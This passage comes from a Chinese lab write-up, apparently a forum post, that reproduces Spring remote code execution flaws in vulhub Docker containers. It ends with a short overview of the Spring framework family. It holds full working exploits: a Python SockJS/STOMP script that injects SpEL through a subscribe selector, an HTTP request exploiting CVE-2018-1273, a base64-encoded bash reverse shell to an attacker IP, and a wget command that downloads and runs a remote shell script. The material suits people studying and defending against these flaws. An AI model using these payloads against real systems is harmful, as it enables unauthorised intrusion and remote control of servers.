            'Referer': url,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
        self.t = int(time.time()*1000)

    def run(self):
        url = f'{self.base}/htmlfile?c=_jp.vulhub'
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)

    def send(self, command, headers, body=''):
        data = [command.upper(), '\n']

        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))

        data.append('\n\n')
        data.append(body)
        data.append('\x00')
        data = json.dumps([''.join(data)])

        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)
        if response.status_code != 204:
            logging.info(f"send '{command}' data error.")
        else:
            logging.info(f"send '{command}' data success.")

    def __del__(self):
        self.session.close()

sockjs = SockJS('http://your-ip:8080/gs-guide-websocket')
sockjs.start()
time.sleep(1)

sockjs.send('connect', {
    'accept-version': '1.1,1.0',
    'heart-beat': '10000,10000'
})
sockjs.send('subscribe', {
    'selector': "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')",
    'id': 'sub-0',
    'destination': '/topic/greetings'
})

data = json.dumps({'name': 'vulhub'})
sockjs.send('send', {
    'content-length': len(data),
    'destination': '/app/hello'
}, data)

```

然后我们这里要进行修改 所以Poc并不通用

![image-20210522093127253](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9582f70170eb4c8b8f23e67ba23714f1bf900dc1.png)

一个是被攻击的IP

一个是执行的命令

一个是名字

进行修改后

![image-20210522093214720](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-29841b72dc8792ef1bb6893b856b23186f1726d2.png)

进行执行

![image-20210522093250917](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9a39abb31ee2466537ed0bb4a9dcc667b3786980.png)

去docker底层查看执行是否成功

![image-20210522093404508](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-deb047dfbd4e7fdfa69ae7a2635c91874f030c55.png)

#### Poc-2-反弹shell

```php
#!/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))

class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
            'Referer': url,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
        self.t = int(time.time()*1000)

    def run(self):
        url = f'{self.base}/htmlfile?c=_jp.vulhub'
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)

    def send(self, command, headers, body=''):
        data = [command.upper(), '\n']

        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))

        data.append('\n\n')
        data.append(body)
        data.append('\x00')
        data = json.dumps([''.join(data)])

        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)
        if response.status_code != 204:
            logging.info(f"send '{command}' data error.")
        else:
            logging.info(f"send '{command}' data success.")

    def __del__(self):
        self.session.close()

sockjs = SockJS('http://192.168.253.7:8080/gs-guide-websocket')
sockjs.start()
time.sleep(1)

sockjs.send('connect', {
    'accept-version': '1.1,1.0',
    'heart-beat': '10000,10000'
})
sockjs.send('subscribe', {
    'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1My42NS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}')",
    'id': 'sub-0',
    'destination': '/topic/greetings'
})

data = json.dumps({'name': 'vulhub'})
sockjs.send('send', {
    'content-length': len(data),
    'destination': '/app/hello'
}, data)

```

同样也是需要修改的

上java编码的网站

```php
http://www.jackson-t.ca/runtime-exec-payloads.html
```

![image-20210521085321594](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c75c2a5f885c6675559c9e7f7355aa66a1726288.png)

```php
bash -i >&amp; /dev/tcp/192.168.175.130/8888 0>&amp;1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}
```

进行修改

![image-20210522093745956](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f7ff4672595a6d0dd808a724e055cf8697c1f9fe.png)

执行poc

![image-20210522093816453](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-47b337b83579ef3f7ef888d419e7930c2c54137b.png)

成功拿到反弹shell

![image-20210522093836061](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cb032fd33e0c81e8c482d82b2c7357084728d06c.png)

### Spring Data Commons远程命令执行漏洞(CVE-2018-1273)

#### 影响版本

```php
Spring Data Commons 1.13~1.13.10(Ingalls SR10)
Spring Data REST 2.6~2.6.10(Ingalls SR10)
Spring Data Commons 2.0~2.0.5(Kay SR5)
Spring Data Rest 3.0~3.0 5(Kay SR5)
较旧的不受支持的版本也会受到影响
```

#### 漏洞搭建

```php
cd vulhub-master/spring/CVE-2018-1273
sudo docker-compose up -d
```

![image-20210522094338512](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-abc327fc2d58c7672033dfb186479c3db445302b.png)

#### 漏洞复现

访问

```php
http://192.168.175.209:8080/users
```

![image-20210522094409667](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-362b622620b56941914149ff766c22f4ffa1a648.png)

#### 漏洞验证

进行抓包

![image-20210522094709560](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3923b4de68e8de01f10f067d773727f7e8e29ea2.png)

#### Poc

```php
POST /users?page=&amp;size=5 HTTP/1.1
Host: 192.168.175.209:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Origin: http://192.168.175.209:8080
Connection: close
Referer: http://192.168.175.209:8080/users
Upgrade-Insecure-Requests: 1

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/a001")]=&amp;password=&amp;repeatedPassword=
```

![image-20210522094845931](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fd3e86c9b052f9fc35a3fd7eee425cf5a2671126.png)

执行之后呢 我们可以去docker底层看一下

![image-20210522094958191](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-79a528690910f1a3ed558b2bc8176b7fc34b6184.png)

#### Poc-2-反弹shell

bash反弹一句话

![image-20210522095153542](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db74adbf3eb659d3af00d0073a9fca68514b530c.png)

python开启http服务

![image-20210522095232922](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-40c7b31010266bcf5bdac6d9ccb0c1b6a9902e25.png)

上传sh脚本

```php
/usr/bin/wget -qO /tmp/a002 http://192.168.175.130:9999/shell.sh
```

进行执行

![image-20210522095354596](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2b8bea3269e738936ad7b7d16e193a6df8c392e7.png)

然后继续去docker底层看一下

可以看到成功写入

![image-20210522095552456](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-52491684b075d6aa90a0288b91e9d4612936abc5.png)

然后进行执行sh脚本

```php
/bin/bash /tmp/a002
```

![image-20210522095701465](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-24dcc8a16a9b9d0124135517601ca8fe645c9e35.png)

成功拿到反弹shell

![image-20210522095743196](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-170b5febce2dff54041857f24cd39e545a3a86d7.png)

总结
==

Spring其中关键的5个部分，分别是

```php
spring framework、springboot、spring cloud、spring security、spring mvc
```

其中的 spring framework就是大家常常提到的 spring，这是所有 sprIng内容最基本的底层架构，其包含 spring mvc、springboot、spring core、IOC和AOP等等

Spring mvc就是 spring中的一个MVC框架，主要用来开发web应用和网络接口，但是其使用之前需要配置大量的xml文件，比较繁琐

所以出现 springboot，其内置 tomcat并且内置默认的XML配置信息，从而方便了用户的使用。下图就直观表现了他们之间的关系

spring security主要是用来做鉴权，保证安全性的

Spring Cloud基于 Spring Boot，简化了分布式系统的开发，集成了服务发现、配置管理、消息总线、负载均衡、断路器、数据监控等各种服务治理能力整个 spring家族有四个重要的基本概念，分别是

```php
IOC:控制反转

Context:上下文

Bean:被Spring 容器管理的Java对象

AOP:面向切面的编程
```